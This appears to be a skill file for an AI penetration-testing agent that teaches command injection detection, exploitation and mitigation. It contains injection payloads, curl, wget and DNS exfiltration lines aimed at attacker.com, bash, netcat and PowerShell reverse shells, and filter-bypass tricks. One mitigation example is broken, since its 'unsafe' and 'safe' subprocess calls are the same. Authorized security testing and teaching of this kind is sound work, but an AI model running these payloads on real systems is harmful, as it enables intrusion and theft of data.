---
name: command-injection-testing
description: Professional skills and methodology for command injection testing
version: 1.0.0
---

# Command Injection Testing

## Overview

Command injection allows system commands to be executed through an application. When user input is passed directly to a system command, an attacker may execute arbitrary commands. This skill covers detection, exploitation, and prevention.

## How the Vulnerability Works

When an application invokes system commands without adequately validating and filtering user input, attackers can inject additional commands.

**Unsafe code example:**
```php
// PHP
system("ping " . $_GET['ip']);

// Python
os.system("ping " + user_input)

// Node.js
child_process.exec("ping " + user_input)
```

## Testing Methods

### 1. Identify Command Execution Points

**Common features:**
- Ping
- DNS queries
- File operations
- System information
- Log viewing
- Backup and recovery

### 2. Basic Detection

**Test command separators:**
```
;  # Command separator (Linux/Windows)
&  # Background execution (Linux/Windows)
|  # Pipe (Linux/Windows)
&& # Logical AND (Linux/Windows)
|| # Logical OR (Linux/Windows)
`  # Command substitution (Linux)
$() # Command substitution (Linux)
```

**Test payloads:**
```
127.0.0.1; id
127.0.0.1 && whoami
127.0.0.1 | cat /etc/passwd
127.0.0.1 `whoami`
127.0.0.1 $(whoami)
```

### 3. Blind Command Injection

**Time-delay detection:**
```
127.0.0.1; sleep 5
127.0.0.1 && sleep 5
127.0.0.1 | sleep 5
```

**Out-of-band data:**
```
127.0.0.1; curl http://attacker.com/?$(whoami)
127.0.0.1 && wget http://attacker.com/$(cat /etc/passwd)
```

**Out-of-band DNS:**
```
127.0.0.1; nslookup $(whoami).attacker.com
```

## Exploitation Techniques

### Basic Command Execution

**Linux：**
```
; id
; whoami
; uname -a
; cat /etc/passwd
; ls -la
```

**Windows：**
```
& whoami
& ipconfig
& type C:\Windows\System32\drivers\etc\hosts
& dir
```

### File Operations

**Read files:**
```
; cat /etc/passwd
; type C:\Windows\System32\config\sam
; head -n 20 /var/log/apache2/access.log
```

**Write files:**
```
; echo "<?php phpinfo(); ?>" > /tmp/shell.php
; echo "test" > C:\temp\test.txt
```

### Reverse Shell

**Bash：**
```
; bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

**Netcat：**
```
; nc -e /bin/bash attacker.com 4444
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f
```

**PowerShell：**
```
& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Bypass Techniques

### Space Filter Bypass

```
${IFS}id
${IFS}whoami
$IFS$9id
<>
%09 (Tab)
%20 (Space)
```

### Command Separator Filter Bypass

**Encoding bypass:**
```
%3b (;)
%26 (&)
%7c (|)
```

**Newline bypass:**
```
%0a (newline)
%0d (carriage return)
```

### Keyword Filter Bypass

**Variable concatenation:**
```bash
a=w;b=ho;c=ami;$a$b$c
```

**Wildcards:**
```bash
/bin/c?t /etc/passwd
/usr/bin/ca* /etc/passwd
```

**Quote bypass:**
```bash
w'h'o'a'm'i
w"h"o"a"m"i
```

**Backslashes:**
```bash
w\ho\am\i
```

**Base64 encoding:**
```bash
echo "d2hvYW1p" | base64 -d | bash
```

### Length Limit Bypass

**Using files:**
```bash
echo "id" > /tmp/c
sh /tmp/c
```

**Using environment variables:**
```bash
export x='id';$x
```

## Tools

### Commix

```bash
# Basic scan
python commix.py -u "http://target.com/ping?ip=127.0.0.1"

# Specify the injection point
python commix.py -u "http://target.com/ping?ip=INJECT_HERE" --data="ip=INJECT_HERE"

# Obtain a shell
python commix.py -u "http://target.com/ping?ip=127.0.0.1" --os-shell
```

### Burp Suite

1. Intercept a request
2. Send to Intruder
3. Use a command injection payload list
4. Observe responses or time delays

## Verification and Reporting

### Verification Steps

1. Confirm that system commands can be executed
2. Verify command execution results
3. Assess impact (system control, data disclosure, etc.)
4. Record the complete proof of concept
5. Record confirmed findings with `report_finding`, the platform's only entry point for findings. Include location, type, severity, reproduction steps/PoC, and remediation guidance

### Report Essentials

- Vulnerability location and input parameters
- Types of commands that can be executed
- Complete exploitation steps and PoC
- Remediation guidance (input validation, parameterization, allowlists, etc.)

## Mitigations

### Recommended Approach

1. **Avoid command execution**
   - Use APIs instead of system commands
   - Use library functions instead of commands

2. **Input validation**
   ```python
   import re
   
   def validate_ip(ip):
       pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
       if not re.match(pattern, ip):
           raise ValueError("Invalid IP")
       parts = ip.split('.')
       if not all(0 <= int(p) <= 255 for p in parts):
           raise ValueError("Invalid IP range")
       return ip
   ```

3. **Parameterized commands**
   ```python
   import subprocess
   
   # Unsafe
   subprocess.call(['ping', '-c', '1', user_input])
   
   # Safe: use an argument list
   subprocess.call(['ping', '-c', '1', validated_ip])
   ```

4. **Allowlist validation**
   ```python
   ALLOWED_COMMANDS = ['ping', 'nslookup']
   ALLOWED_OPTIONS = {'ping': ['-c', '-n']}
   
   if command not in ALLOWED_COMMANDS:
       raise ValueError("Command not allowed")
   ```

5. **Least privilege**
   - Run the application as a low-privilege user
   - Restrict filesystem access
   - Use chroot or container isolation

6. **Output filtering**
   - Limit output contents
   - Filter sensitive information
   - Log command execution

## Considerations

- Test only in authorized environments
- Avoid damaging the system
- Account for command differences between operating systems
- Consider the impact of command execution during testing